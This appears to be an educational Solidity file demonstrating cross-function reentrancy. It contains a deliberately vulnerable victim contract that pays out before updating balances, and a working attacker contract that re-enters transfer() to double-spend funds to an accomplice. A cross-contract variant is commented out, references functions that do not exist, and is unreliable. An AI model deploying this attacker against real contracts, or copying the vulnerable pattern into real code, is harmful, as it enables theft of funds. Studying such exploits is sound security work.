// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

/**
 * @notice type 2 CROSS-FUNCTION REENTRANCY
 *
 * see contract #25 Reentrancy Ether for type 1
 *
 * Exploits: a vulnerable function within a contract shares the state (balances)
 * with another function that benefits the attacker (transfer)
 *
 * Result: the attacker gets his money back but in the meantime
 * it also assign the balance value to its accomplice
 *
 *
 * @notice type 3 CROSS-CONTRACT REENTRANCY
 * NOTE send() and transfer() are safe against reentrancy
 */
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

/**
 * -------------------------------------------------------------------------------------
 * 1. Victim contract First Cross Attack: Cross Function
 * -------------------------------------------------------------------------------------
 */

contract ReentrancyVictimFunction {
    error ReentrancyVictim_balanceIsLow();
    error ReentrancyVictim_callFailed();

    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function transfer(address to, uint256 amount) external {
        // double spending
        if (balances[msg.sender] >= amount) {
            //1 ether
            //sender is the attacker
            //it's still 1 ether, balances has not been updated yet!
            balances[msg.sender] -= amount; // attacker has 0 ether
            balances[to] += amount; // attacker has 1 ether
        }
    }

    /**
     * Identical as in contract 25
     */
    function withdraw() public {
        uint256 userBalance = balances[msg.sender];
        // 1) Check
        if (userBalance == 0) {
            revert ReentrancyVictim_balanceIsLow();
        }
        // 2) Interacion
        (bool success,) = msg.sender.call{value: userBalance}(""); //this triggers the fallback function in the receiver
        if (!success) {
            revert ReentrancyVictim_callFailed();
        }
        // 3) Effect
        balances[msg.sender] = 0;
    }

    function getBalances(address user) public view returns (uint256) {
        return balances[user];
    }
}

/**
 * -------------------------------------------------------------------------------------
 * 2. Victim contract Second Cross Attack: Cross Contract
 * -------------------------------------------------------------------------------------
 */
contract OkToken is Ownable {
    mapping(address => uint256) public balance; // the problematic shared state variable e.g. balances

    constructor() Ownable(msg.sender) {}
}

// contract ReentrancyVictimContract is ReentrancyGuard {
//     OkToken oktoken;
//     uint256 public contractBalance;
//     uint256 public attackerBalance;

//     constructor() {}

//     function deposit() external payable {}

//     /* 
//      * Identical as in ReentrancyVictimFunction, 
//      * except we call a function (burn) instead of modifying the state (balances)
//      * 
//      * The reentrancy guard does not prevent the attack
//      * Bad use of CEI > burn is after sending tokens (CIE)
//      */

//     function withdraw() external payable nonReentrant {
//         uint256 balance = oktoken.balanceOf(msg.sender);
//         require(balance > 0, "Insufficient balance");

//         //call will fail if no receive function exists in the receiving contract (attacker)
//         (bool success,) = msg.sender.call{value: balance}("");
//         require(success, "Failed to send Ether");

//         success = oktoken.burn(msg.sender, balance); // now sender does not have a balance to burn
//         require(success, "Failed to burn token");
//     }

//     function getOkToken() public view returns (OkToken) {
//         return oktoken;
//     }
// }

/**
 * -------------------------------------------------------------------------------------
 * 3. Attacker contract for both Reentrancy Cross attacks
 * -------------------------------------------------------------------------------------
 */

contract ReentrancyAttacker {
    ReentrancyVictimFunction immutable victimFunction;
    // ReentrancyVictimContract immutable victimContract;
    address immutable accomplice;
    CrossAttackType currentAttackType;

    enum CrossAttackType {
        FUNCTION,
        CONTRACT
    }

    error ReentrancyAttacker_sendingNotEnoughEthers();

    constructor(address _victimFunction, address _victimContract, address _accomplice) {
        victimFunction = ReentrancyVictimFunction(_victimFunction);
        // victimContract = ReentrancyVictimContract(_victimContract);
        accomplice = _accomplice;
    }

    function attack(CrossAttackType attackType) external payable {
        currentAttackType = attackType;
        if (msg.value < 1 ether) revert ReentrancyAttacker_sendingNotEnoughEthers();
        if (attackType == CrossAttackType.FUNCTION) {
            victimFunction.deposit{value: msg.value}();
            victimFunction.withdraw(); // calls a receive / fallback
        }
        // if (attackType == CrossAttackType.CONTRACT) {
        //     victimContract.deposit{value: msg.value}();
        //     victimContract.withdraw(); // calls a receive / fallback
        // }
    }

    receive() external payable {
        // the attacker's token has not been burn: he can transfer it to carl
        if (currentAttackType == CrossAttackType.FUNCTION) {
            if (address(victimFunction).balance >= msg.value) {
                victimFunction.transfer(accomplice, 1 ether);
            }
        }
        // if (currentAttackType == CrossAttackType.CONTRACT) {
        //     if (address(victimContract).balance >= msg.value) {
        //         victimContract.getOkToken().transfer(accomplice, 1 ether); // this
        //     }
        // }
    }

}
